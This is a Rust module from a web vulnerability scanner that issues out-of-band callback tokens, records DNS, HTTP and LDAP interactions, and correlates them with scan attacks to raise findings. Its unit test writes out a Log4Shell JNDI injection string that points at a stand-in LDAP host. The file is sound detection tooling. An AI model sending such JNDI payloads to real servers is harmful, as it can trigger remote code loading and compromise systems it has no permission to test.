//! Out-of-band interactions (a Collaborator/interactsh-like listener): unique
//! payload tokens, their storage, and correlation of received interactions to
//! the scan attacks that carried them. See docs/OOB.md.
//!
//! The listener (`server`) only receives connections. Nothing here sends
//! anything to the OOB host; attacks go through the active scanner's guarded
//! client.

pub mod server;

use std::io::Read;

use rusqlite::{params, OptionalExtension};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::capture::Capture;
use crate::error::{Error, Result};
use crate::http::Target;
use crate::scan::{AlertDef, Message};
use crate::store::Store;

/// `meta` key holding the running listener's [`OobState`].
pub const STATE_KEY: &str = "oob.state";

/// Tokens are `bp` followed by this many base32 characters.
const TOKEN_RANDOM: usize = 18;
const BASE32: &[u8; 32] = b"abcdefghijklmnopqrstuvwxyz234567";

pub(crate) const SCHEMA: &str = "
CREATE TABLE IF NOT EXISTS oob_payloads (
    token TEXT PRIMARY KEY,
    time TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now')),
    source TEXT NOT NULL,
    rule_id INTEGER,
    alert_ref TEXT,
    param TEXT NOT NULL DEFAULT '',
    attack TEXT NOT NULL DEFAULT '',
    other_info TEXT NOT NULL DEFAULT '',
    origin TEXT,
    request BLOB,
    response BLOB,
    duration_ms INTEGER,
    history_id INTEGER,
    note TEXT
);
CREATE TABLE IF NOT EXISTS oob_interactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    time TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%fZ','now')),
    protocol TEXT NOT NULL,
    remote TEXT NOT NULL,
    token TEXT,
    summary TEXT NOT NULL,
    raw BLOB NOT NULL,
    processed INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX IF NOT EXISTS oob_interactions_token ON oob_interactions(token);
";

pub const PAYLOAD_COLUMNS: &[(&str, &str, &str)] = &[
    ("token", "TEXT", "Unique token carried by the payload"),
    ("time", "TEXT", "UTC time the payload was issued"),
    ("source", "TEXT", "scan (an active rule's attack) or manual (oob payload)"),
    ("rule_id", "INTEGER", "Active rule that sent it"),
    ("alert_ref", "TEXT", "Alert raised when an interaction arrives"),
    ("param", "TEXT", "Attacked parameter"),
    ("attack", "TEXT", "Attack string"),
    ("origin", "TEXT", "Attacked origin (scheme://host:port)"),
    ("request", "BLOB", "Attack request"),
    ("response", "BLOB", "Attack response, if one arrived"),
    ("history_id", "INTEGER", "History row of the attack once an interaction raised a finding"),
    ("note", "TEXT", "Note given to `oob payload`"),
];

pub const INTERACTION_COLUMNS: &[(&str, &str, &str)] = &[
    ("id", "INTEGER", "Interaction id"),
    ("time", "TEXT", "UTC time received"),
    ("protocol", "TEXT", "dns, http, ldap, tls, or tcp"),
    ("remote", "TEXT", "Sender address (for DNS usually the target's resolver)"),
    ("token", "TEXT", "Token found in the interaction (join oob_payloads ON token)"),
    ("summary", "TEXT", "One line: DNS question, HTTP request line, ..."),
    ("raw", "BLOB", "Received bytes (at most 16 KiB)"),
    ("processed", "INTEGER", "1 once correlation has looked at it"),
];

/// Where targets reach the listener (the public side, which may differ from the
/// listen address behind NAT).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Endpoint {
    /// Wildcard domain served by our DNS (DNS mode); None: host mode.
    pub domain: Option<String>,
    /// Host or IP targets connect to for HTTP/LDAP/TLS.
    pub public_host: String,
    pub public_port: u16,
    /// `public_host` was guessed (default route); payloads for a target then use
    /// the local address that routes to it.
    #[serde(default)]
    pub auto_host: bool,
}

/// The running listener, stored under [`STATE_KEY`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OobState {
    pub pid: u32,
    pub started: String,
    pub tcp_listen: String,
    pub dns_listen: Option<String>,
    pub public_ip: Option<String>,
    pub endpoint: Endpoint,
    pub log: Option<std::path::PathBuf>,
}

/// One payload: put `host` or `url` into an attack.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Payload {
    pub token: String,
    /// `<token>.<domain>` in DNS mode, `<public_host>:<port>` in host mode.
    pub host: String,
    /// An http URL carrying the token.
    pub url: String,
    /// Whether the token is in the host name (a DNS lookup alone is an interaction).
    pub dns: bool,
}

/// The local address the OS would use to reach `host:port`. A UDP `connect`
/// only picks a route; nothing is sent.
pub fn route_ip(host: &str, port: u16) -> Option<std::net::IpAddr> {
    let addr = std::net::ToSocketAddrs::to_socket_addrs(&(host, port)).ok()?.next()?;
    let bind = if addr.is_ipv4() { "0.0.0.0:0" } else { "[::]:0" };
    let s = std::net::UdpSocket::bind(bind).ok()?;
    s.connect(addr).ok()?;
    s.local_addr().ok().map(|a| a.ip()).filter(|ip| !ip.is_unspecified())
}

impl Endpoint {
    /// This endpoint as seen from `host:port`: with a guessed public host (and no
    /// domain), the local address routing to the target replaces it.
    pub fn for_target(&self, host: &str, port: u16) -> Endpoint {
        let mut e = self.clone();
        if e.auto_host && e.domain.is_none() {
            if let Some(ip) = route_ip(host, port) {
                e.public_host = ip.to_string();
            }
        }
        e
    }

    pub fn payload(&self) -> Result<Payload> {
        Ok(self.payload_for(new_token()?))
    }

    pub fn payload_for(&self, token: String) -> Payload {
        let port = if self.public_port == 80 { String::new() } else { format!(":{}", self.public_port) };
        match &self.domain {
            Some(d) => {
                let host = format!("{token}.{d}");
                Payload { url: format!("http://{host}{port}/"), host, token, dns: true }
            }
            None => {
                let h = if self.public_host.contains(':') {
                    format!("[{}]", self.public_host)
                } else {
                    self.public_host.clone()
                };
                let host = format!("{h}:{}", self.public_port);
                Payload { url: format!("http://{h}{port}/{token}"), host, token, dns: false }
            }
        }
    }
}

/// A fresh random token: `bp` + 18 base32 characters (90 bits).
pub fn new_token() -> Result<String> {
    let mut bytes = [0u8; TOKEN_RANDOM];
    std::fs::File::open("/dev/urandom")?.read_exact(&mut bytes)?;
    let mut t = String::from("bp");
    t.extend(bytes.iter().map(|b| BASE32[(b & 31) as usize] as char));
    Ok(t)
}

/// Every token-shaped string in `data` (case-insensitive), in order.
pub fn find_tokens(data: &[u8]) -> Vec<String> {
    let lower = data.to_ascii_lowercase();
    let mut out = Vec::new();
    let mut i = 0;
    while i + 2 + TOKEN_RANDOM <= lower.len() {
        if &lower[i..i + 2] == b"bp" && lower[i + 2..i + 2 + TOKEN_RANDOM].iter().all(|b| BASE32.contains(b)) {
            let t = String::from_utf8_lossy(&lower[i..i + 2 + TOKEN_RANDOM]).into_owned();
            if !out.contains(&t) {
                out.push(t);
            }
            i += 2 + TOKEN_RANDOM;
        } else {
            i += 1;
        }
    }
    out
}

/// A scan attack waiting for an interaction.
pub struct ScanPayload<'a> {
    pub token: &'a str,
    pub rule_id: u32,
    pub alert_ref: &'a str,
    pub param: &'a str,
    pub attack: &'a str,
    pub other_info: &'a str,
    pub target: &'a Target,
    pub request: &'a [u8],
    pub response: Option<&'a [u8]>,
    pub duration_ms: Option<i64>,
}

/// What a correlation pass did.
#[derive(Debug, Clone, Default, Serialize)]
pub struct Correlation {
    /// Interactions looked at.
    pub interactions: usize,
    /// Interactions that matched a scan payload.
    pub matched: usize,
    /// Findings that were new (not just another hit of a known one).
    pub new_findings: usize,
    /// Alert refs raised (one entry per matched interaction).
    pub raised: Vec<String>,
}

impl Store {
    pub fn oob_add_scan_payload(&self, p: &ScanPayload) -> Result<()> {
        self.conn.execute(
            "INSERT OR IGNORE INTO oob_payloads
                (token, source, rule_id, alert_ref, param, attack, other_info, origin, request, response, duration_ms)
             VALUES (?1, 'scan', ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10)",
            params![
                p.token,
                p.rule_id,
                p.alert_ref,
                p.param,
                p.attack,
                p.other_info,
                p.target.origin(),
                p.request,
                p.response,
                p.duration_ms
            ],
        )?;
        Ok(())
    }

    pub fn oob_add_manual_payload(&self, token: &str, note: Option<&str>) -> Result<()> {
        self.conn.execute(
            "INSERT INTO oob_payloads (token, source, note) VALUES (?1, 'manual', ?2)",
            params![token, note],
        )?;
        Ok(())
    }

    /// Records a received interaction; the token is the first registered one in
    /// `raw`, else the first token-shaped string.
    pub fn oob_add_interaction(&self, protocol: &str, remote: &str, summary: &str, raw: &[u8]) -> Result<i64> {
        let tokens = find_tokens(raw);
        let mut token = tokens.first().cloned();
        for t in &tokens {
            let known: Option<i64> =
                self.conn.query_row("SELECT 1 FROM oob_payloads WHERE token = ?1", [t], |r| r.get(0)).optional()?;
            if known.is_some() {
                token = Some(t.clone());
                break;
            }
        }
        self.conn.execute(
            "INSERT INTO oob_interactions (protocol, remote, token, summary, raw) VALUES (?1, ?2, ?3, ?4, ?5)",
            params![protocol, remote, token, summary, raw],
        )?;
        Ok(self.conn.last_insert_rowid())
    }

    /// Interactions after `since`, newest last, with their payload's details.
    pub fn oob_interactions(
        &self,
        since: i64,
        token: Option<&str>,
        limit: usize,
        max_raw: usize,
    ) -> Result<Vec<Value>> {
        let mut stmt = self.conn.prepare(
            "SELECT i.id, i.time, i.protocol, i.remote, i.token, i.summary, i.raw,
                    p.source, p.rule_id, p.alert_ref, p.param, p.origin, p.note, p.history_id
             FROM oob_interactions i LEFT JOIN oob_payloads p ON p.token = i.token
             WHERE i.id > ?1 AND (?2 IS NULL OR i.token = ?2)
             ORDER BY i.id LIMIT ?3",
        )?;
        let rows = stmt.query_map(params![since, token, limit as i64], |r| {
            let raw: Vec<u8> = r.get(6)?;
            let source: Option<String> = r.get(7)?;
            let payload = source.map(|s| -> rusqlite::Result<Value> {
                Ok(json!({
                    "source": s,
                    "rule_id": r.get::<_, Option<i64>>(8)?,
                    "alert_ref": r.get::<_, Option<String>>(9)?,
                    "param": r.get::<_, Option<String>>(10)?,
                    "origin": r.get::<_, Option<String>>(11)?,
                    "note": r.get::<_, Option<String>>(12)?,
                    "history_id": r.get::<_, Option<i64>>(13)?,
                }))
            });
            Ok(json!({
                "id": r.get::<_, i64>(0)?,
                "time": r.get::<_, String>(1)?,
                "protocol": r.get::<_, String>(2)?,
                "remote": r.get::<_, String>(3)?,
                "token": r.get::<_, Option<String>>(4)?,
                "summary": r.get::<_, String>(5)?,
                "raw": String::from_utf8_lossy(&raw[..raw.len().min(max_raw)]),
                "raw_truncated": raw.len() > max_raw,
                "payload": payload.transpose()?,
            }))
        })?;
        Ok(rows.collect::<rusqlite::Result<_>>()?)
    }

    /// (payloads, interactions, interactions without a known token).
    pub fn oob_counts(&self) -> Result<(i64, i64, i64)> {
        Ok(self.conn.query_row(
            "SELECT (SELECT COUNT(*) FROM oob_payloads), (SELECT COUNT(*) FROM oob_interactions),
                    (SELECT COUNT(*) FROM oob_interactions i WHERE NOT EXISTS
                        (SELECT 1 FROM oob_payloads p WHERE p.token = i.token))",
            [],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)),
        )?)
    }

    pub fn oob_token_exists(&self, token: &str) -> Result<bool> {
        Ok(self
            .conn
            .query_row("SELECT COUNT(*) FROM oob_payloads WHERE token = ?1", [token], |r| r.get::<_, i64>(0))?
            > 0)
    }
}

/// Raises a finding for every unprocessed interaction that carries a scan
/// payload's token, recording the attack exchange in history the first time.
/// `lookup` maps an alert ref to its definition (the active rules' alerts).
pub fn correlate(store: &mut Store, lookup: impl Fn(&str) -> Option<&'static AlertDef>) -> Result<Correlation> {
    struct Row {
        id: i64,
        protocol: String,
        remote: String,
        summary: String,
        raw: Vec<u8>,
        token: Option<String>,
    }
    let rows: Vec<Row> = {
        let mut stmt = store.conn.prepare(
            "SELECT id, protocol, remote, summary, raw, token FROM oob_interactions WHERE processed = 0 ORDER BY id",
        )?;
        let it = stmt.query_map([], |r| {
            Ok(Row {
                id: r.get(0)?,
                protocol: r.get(1)?,
                remote: r.get(2)?,
                summary: r.get(3)?,
                raw: r.get(4)?,
                token: r.get(5)?,
            })
        })?;
        it.collect::<rusqlite::Result<_>>()?
    };
    let mut out = Correlation { interactions: rows.len(), ..Default::default() };
    for row in rows {
        store.conn.execute("UPDATE oob_interactions SET processed = 1 WHERE id = ?1", [row.id])?;
        let Some(token) = &row.token else { continue };
        type P = (String, String, String, String, String, Vec<u8>, Option<Vec<u8>>, Option<i64>, Option<i64>);
        let p: Option<P> = store
            .conn
            .query_row(
                "SELECT alert_ref, param, attack, other_info, origin, request, response, duration_ms, history_id
                 FROM oob_payloads WHERE token = ?1 AND source = 'scan'",
                [token],
                |r| {
                    Ok((
                        r.get(0)?,
                        r.get(1)?,
                        r.get(2)?,
                        r.get(3)?,
                        r.get(4)?,
                        r.get(5)?,
                        r.get(6)?,
                        r.get(7)?,
                        r.get(8)?,
                    ))
                },
            )
            .optional()?;
        let Some((alert_ref, param, attack, other_info, origin, request, response, duration_ms, history_id)) = p else {
            continue;
        };
        let Some(def) = lookup(&alert_ref) else { continue };
        let target = Target::from_url(&origin)?;
        let response = response.unwrap_or_default();
        let history_id = match history_id {
            Some(id) => id,
            None => {
                let resp = (!response.is_empty()).then_some(response.as_slice());
                let error = resp.is_none().then_some("no response (the out-of-band interaction still arrived)");
                let id = store.record(&Capture::new("scan", &target, &request, resp, duration_ms, error))?;
                store.conn.execute("UPDATE oob_payloads SET history_id = ?1 WHERE token = ?2", params![id, token])?;
                id
            }
        };
        let msg = Message::from_exchange(history_id, &target, &request, &response);
        let mut info = other_info;
        if !info.is_empty() {
            info.push('\n');
        }
        info.push_str(&format!(
            "Received {} interaction from {}: {}\nInteraction:\n{}",
            row.protocol,
            row.remote,
            row.summary,
            String::from_utf8_lossy(&row.raw[..row.raw.len().min(4096)])
        ));
        // No evidence (like ZAP's OAST alerts): repeated callbacks for the same
        // parameter, from any payload or protocol, count as hits of one finding.
        let finding = def.raise(param, "").attack(attack).other_info(info);
        out.new_findings += store.record_findings("active", &msg, std::slice::from_ref(&finding))?;
        out.matched += 1;
        out.raised.push(alert_ref);
    }
    Ok(out)
}

/// Parses a stored state.
pub fn read_state(store: &Store) -> Result<Option<OobState>> {
    match store.meta_get(STATE_KEY)? {
        Some(s) => serde_json::from_str(&s).map(Some).map_err(|e| Error::Protocol(format!("bad {STATE_KEY}: {e}"))),
        None => Ok(None),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::scan::{Confidence, Risk};

    static DEF: AlertDef = AlertDef {
        alert_ref: "40043-1",
        name: "Log4Shell (CVE-2021-44228)",
        risk: Risk::High,
        confidence: Confidence::Medium,
        cwe: 117,
        wasc: 20,
        description: "d",
        solution: "s",
        references: &[],
        tags: &[],
    };

    #[test]
    fn tokens_and_payloads() {
        let t = new_token().unwrap();
        assert_eq!(t.len(), 20);
        assert!(t.starts_with("bp"));
        assert_ne!(t, new_token().unwrap());
        // Found in a DNS name with random case, a path, and binary LDAP data.
        let upper = t.to_ascii_uppercase();
        assert_eq!(find_tokens(format!("{upper}.oob.example.com").as_bytes()), vec![t.clone()]);
        let mut ldap = vec![0x30, 0x2c, 0x04, 0x14];
        ldap.extend_from_slice(t.as_bytes());
        ldap.push(0x0a);
        assert_eq!(find_tokens(&ldap), vec![t.clone()]);
        assert!(find_tokens(b"GET /bp123 HTTP/1.1").is_empty());

        let dns = Endpoint {
            domain: Some("oob.test".into()),
            public_host: "oob.test".into(),
            public_port: 80,
            auto_host: false,
        };
        let p = dns.payload_for(t.clone());
        assert_eq!(p.host, format!("{t}.oob.test"));
        assert_eq!(p.url, format!("http://{t}.oob.test/"));
        assert!(p.dns);
        let host = Endpoint { domain: None, public_host: "203.0.113.5".into(), public_port: 8880, auto_host: false };
        let p = host.payload_for(t.clone());
        assert_eq!(p.host, "203.0.113.5:8880");
        assert_eq!(p.url, format!("http://203.0.113.5:8880/{t}"));
        assert!(!p.dns);
        let v6 = Endpoint { domain: None, public_host: "::1".into(), public_port: 80, auto_host: false };
        assert_eq!(v6.payload_for(t.clone()).url, format!("http://[::1]/{t}"));
        // A guessed host is replaced by the address routing to the target.
        let auto = Endpoint { domain: None, public_host: "198.51.100.7".into(), public_port: 8880, auto_host: true };
        assert_eq!(auto.for_target("127.0.0.1", 80).public_host, "127.0.0.1");
        assert_eq!(host.for_target("127.0.0.1", 80), host);
    }

    #[test]
    fn correlation_raises_once_per_finding_and_marks_processed() {
        let mut store = Store::open_in_memory().unwrap();
        let target = Target::from_url("http://app.test:8080/").unwrap();
        let tok = new_token().unwrap();
        let req = format!("GET /?q=${{jndi:ldap://{tok}.oob.test/abc}} HTTP/1.1\r\nHost: app.test:8080\r\n\r\n");
        store
            .oob_add_scan_payload(&ScanPayload {
                token: &tok,
                rule_id: 40043,
                alert_ref: "40043-1",
                param: "q",
                attack: "${jndi:...}",
                other_info: "",
                target: &target,
                request: req.as_bytes(),
                response: Some(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n"),
                duration_ms: Some(3),
            })
            .unwrap();
        let manual = new_token().unwrap();
        store.oob_add_manual_payload(&manual, Some("by hand")).unwrap();
        // Two DNS lookups of the scan token, one manual hit, one stray.
        let q = format!("A {tok}.oob.test");
        store.oob_add_interaction("dns", "10.0.0.1:5353", &q, q.as_bytes()).unwrap();
        store.oob_add_interaction("dns", "10.0.0.2:5353", &q, q.as_bytes()).unwrap();
        store.oob_add_interaction("http", "10.0.0.1:1", "GET /", format!("GET /{manual}").as_bytes()).unwrap();
        store.oob_add_interaction("tcp", "10.0.0.9:1", "junk", b"junk").unwrap();

        let lookup = |r: &str| (r == "40043-1").then_some(&DEF);
        let c = correlate(&mut store, lookup).unwrap();
        assert_eq!((c.interactions, c.matched, c.new_findings), (4, 2, 1), "{c:?}");
        assert_eq!(c.raised, vec!["40043-1", "40043-1"]);
        // Nothing left to process.
        let c = correlate(&mut store, lookup).unwrap();
        assert_eq!((c.interactions, c.matched), (0, 0));

        let all = store.oob_interactions(0, None, 10, 100).unwrap();
        assert_eq!(all.len(), 4);
        assert_eq!(all[0]["payload"]["alert_ref"], "40043-1");
        assert!(all[0]["payload"]["history_id"].as_i64().is_some());
        assert_eq!(all[2]["payload"]["note"], "by hand");
        assert!(all[3]["payload"].is_null());
        assert_eq!(store.oob_interactions(2, Some(&tok), 10, 100).unwrap().len(), 0);
        assert_eq!(store.oob_counts().unwrap(), (2, 4, 1));

        let ro = store
            .query("SELECT param, evidence, other_info FROM findings WHERE alert_ref = '40043-1'", &[], 10, 1000)
            .unwrap();
        assert_eq!(ro.rows.len(), 1);
        assert_eq!(ro.rows[0][0], "q");
        assert_eq!(ro.rows[0][1], "");
        assert!(ro.rows[0][2].as_str().unwrap().contains("Received dns interaction from 10.0.0.1:5353"));
    }
}
